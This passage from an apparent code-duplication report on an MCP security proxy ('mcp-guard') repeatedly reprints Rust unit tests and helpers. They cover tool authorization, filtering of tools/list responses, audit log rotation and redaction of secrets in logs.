    fn test_extract_tool_name_returns_none_without_params() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.4% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.4% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.3% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.3% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 307

**Code:**
```
    fn test_filter_tools_list_multiple_allowed() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "list_files", "description": "List files"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);

        let names: Vec<&str> = tools.iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"list_files"));
        assert!(!names.contains(&"write_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 346

**Code:**
```
    fn test_extract_tool_name() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "read_file", "arguments": {}})),
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), Some("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 346

**Code:**
```
    fn test_extract_tool_name() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "read_file", "arguments": {}})),
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), Some("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 360

**Code:**
```
    fn test_extract_tool_name_returns_none_for_non_tool_call() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("resources/list".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 360

**Code:**
```
    fn test_extract_tool_name_returns_none_for_non_tool_call() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("resources/list".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 374

**Code:**
```
    fn test_extract_tool_name_returns_none_without_params() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 374

**Code:**
```
    fn test_extract_tool_name_returns_none_without_params() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 95.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1188

**Code:**
```
    fn test_rotating_file_writer_size_trigger() {
        let temp_dir = TempDir::new().expect("Should create temp dir");
        let log_path = temp_dir.path().join("test.log");

        let config = LogRotationConfig {
            enabled: true,
            max_size_bytes: Some(100), // Small size to trigger rotation
            max_age_secs: None,
            max_backups: 3,
            compress: false,
        };

        let mut writer = RotatingFileWriter::new(log_path.clone(), config).expect("Should create");

        // Write enough data to trigger rotation
        for i in 0..20 {
            writer.write_line(&format!("Log line number {} with some padding", i)).expect("Should write");
        }
        writer.flush().expect("Should flush");

        // Check that backup files were created
        let files: Vec<_> = std::fs::read_dir(temp_dir.path())
            .expect("Should read dir")
            .filter_map(|e| e.ok())
            .collect();

        // Should have at least the current log file and one backup
        assert!(files.len() >= 2, "Should have rotated files, got {}", files.len());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1297

**Code:**
```
    fn test_audit_entry_creation() {
        let entry = AuditEntry::new(EventType::AuthSuccess)
            .with_identity("user123")
            .with_success(true);

        assert_eq!(entry.identity_id, Some("user123".to_string()));
        assert!(entry.success);
        assert!(matches!(entry.event_type, EventType::AuthSuccess));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1382

**Code:**
```
    fn test_audit_logger_new_disabled_config() {
        let mut config = test_config();
        config.enabled = false;

        let logger = AuditLogger::new(&config).expect("Should create logger");
        // Should not panic
        logger.log_auth_success("user1");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1328

**Code:**
```
    fn test_audit_entry_serialization() {
        let entry = AuditEntry::new(EventType::AuthFailure)
            .with_identity("user1")
            .with_success(false)
            .with_message("Invalid credentials");

        let json = serde_json::to_string(&entry).expect("Should serialize");
        assert!(json.contains("auth_failure"));
        assert!(json.contains("user1"));
        assert!(json.contains("Invalid credentials"));
        assert!(json.contains("\"success\":false"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1363

**Code:**
```
    fn test_audit_logger_disabled() {
        let logger = AuditLogger::disabled();

        // Should not panic when logging to disabled logger
        logger.log_auth_success("user1");
        logger.log_auth_failure("bad credentials");
        logger.log_tool_call("user1", "read_file", Some("req-1"));
        logger.log_rate_limited("user1");
        logger.log_authz_denied("user1", "write_file", "not allowed");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1297

**Code:**
```
    fn test_audit_entry_creation() {
        let entry = AuditEntry::new(EventType::AuthSuccess)
            .with_identity("user123")
            .with_success(true);

        assert_eq!(entry.identity_id, Some("user123".to_string()));
        assert!(entry.success);
        assert!(matches!(entry.event_type, EventType::AuthSuccess));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 781

**Code:**
```
    fn flush(&mut self) -> io::Result<()> {
        match self {
            FileWriter::Simple(f) => f.flush(),
            FileWriter::Rotating(r) => r.flush(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1342

**Code:**
```
    fn test_audit_batch_serialization() {
        let entries = vec![
            AuditEntry::new(EventType::AuthSuccess).with_identity("user1"),
            AuditEntry::new(EventType::ToolCall).with_identity("user2").with_tool("read_file"),
        ];

        let batch = AuditBatch {
            timestamp: Utc::now(),
            source: "mcp-guard".to_string(),
            count: entries.len(),
            entries,
        };

        let json = serde_json::to_string(&batch).expect("Should serialize");
        assert!(json.contains("mcp-guard"));
        assert!(json.contains("user1"));
        assert!(json.contains("user2"));
        assert!(json.contains("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1171

**Code:**
```
    fn test_rotating_file_writer_creation() {
        let temp_dir = TempDir::new().expect("Should create temp dir");
        let log_path = temp_dir.path().join("test.log");

        let config = LogRotationConfig {
            enabled: true,
            max_size_bytes: Some(1024),
            max_age_secs: None,
            max_backups: 3,
            compress: false,
        };

        let writer = RotatingFileWriter::new(log_path.clone(), config);
        assert!(writer.is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1342

**Code:**
```
    fn test_audit_batch_serialization() {
        let entries = vec![
            AuditEntry::new(EventType::AuthSuccess).with_identity("user1"),
            AuditEntry::new(EventType::ToolCall).with_identity("user2").with_tool("read_file"),
        ];

        let batch = AuditBatch {
            timestamp: Utc::now(),
            source: "mcp-guard".to_string(),
            count: entries.len(),
            entries,
        };

        let json = serde_json::to_string(&batch).expect("Should serialize");
        assert!(json.contains("mcp-guard"));
        assert!(json.contains("user1"));
        assert!(json.contains("user2"));
        assert!(json.contains("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 288

**Code:**
```
    fn cleanup_old_backups(&self) -> io::Result<()> {
        let parent = self.path.parent().unwrap_or_else(|| std::path::Path::new("."));
        let base_name = self.path.file_name().unwrap_or_default().to_string_lossy();

        // Find all backup files
        let mut backups: Vec<_> = fs::read_dir(parent)?
            .filter_map(|e| e.ok())
            .filter(|e| {
                let name = e.file_name().to_string_lossy().to_string();
                // Match files like "audit.log.20251225-120000" or "audit.log.20251225-120000.gz"
                name.starts_with(&format!("{}.", base_name)) && name != base_name.as_ref()
            })
            .collect();

        // Sort by modification time (oldest first)
        backups.sort_by_key(|e| {
            e.metadata()
                .and_then(|m| m.modified())
                .unwrap_or(std::time::SystemTime::UNIX_EPOCH)
        });

        // Remove oldest backups if we have too many
        let to_remove = backups.len().saturating_sub(self.config.max_backups);
        for entry in backups.into_iter().take(to_remove) {
            let path = entry.path();
            if let Err(e) = fs::remove_file(&path) {
                tracing::warn!(error = %e, path = %path.display(), "Failed to remove old backup");
            } else {
                tracing::debug!(path = %path.display(), "Removed old backup file");
            }
        }

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 66

**Code:**
```
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
